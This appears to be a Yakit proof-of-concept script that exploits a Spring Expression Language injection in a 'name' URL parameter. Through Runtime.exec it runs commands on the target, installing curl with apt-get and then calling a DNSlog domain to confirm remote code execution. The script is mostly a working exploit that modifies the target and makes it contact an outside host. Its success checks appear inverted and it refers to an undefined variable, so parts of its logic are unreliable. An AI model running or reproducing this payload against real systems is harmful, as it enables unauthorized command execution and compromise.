yakit.AutoInitYakit()
log.setLevel("info")

domain, token, err = risk.NewDNSLogDomain()
target = cli.String("target")
cmd = "apt-get install -y curl"

yakit.Info("[+]开始检测")

sendPacket = func (target,cmd){
    return poc.HTTP(`GET /?name={{url(T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('{{params(cmd)}}'))}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36`,
        poc.params({
            "target": target,
            "cmd": cmd,
        }),
    )
}

res, req, err = sendPacket(target,cmd)
yakit.Info("[+]执行命令为：" + cmd)

if err != nil{
    yakit.Info("[+]安装curl指令成功:" + string(err))
}else{
    yakit.Info("[-]安装curl指令失败")
    yakit.Error("[-]不存在漏洞")
}

cmd="curl "+domain

sendPacket = func (target,cmd){
    return poc.HTTP(`GET /?name={{url(T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('{{params(cmd)}}'))}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36`,
        poc.params({
            "target": target,
            "cmd": cmd,
        }),
    )
}

res, req, err = sendPacket(target,cmd)
yakit.Info("[+]执行的命令为："+cmd)

if err != nil{
    yakit.Info("[+]执行curl指令成功:" + string(err))
}else{
    yakit.Info("[-]执行curl指令失败")
    yakit.Error("[-]不存在漏洞")
}


dnslogss, errDns = risk.CheckDNSLogByToken(token)
// header, body = poc.Split(req)
// yakit.Info("[+]响应header为："+string(header))
// yakit.Info("[+]响应body为："+string(body))


if errDns != nil {
yakit.Error("[-]不存在漏洞")
yakit.Error("[-]DNSlog未接收到反应")
println(errDns)
}else{
yakit.Info("[+]存在漏洞")
yakit.Info("URL: %v", result.Url)
}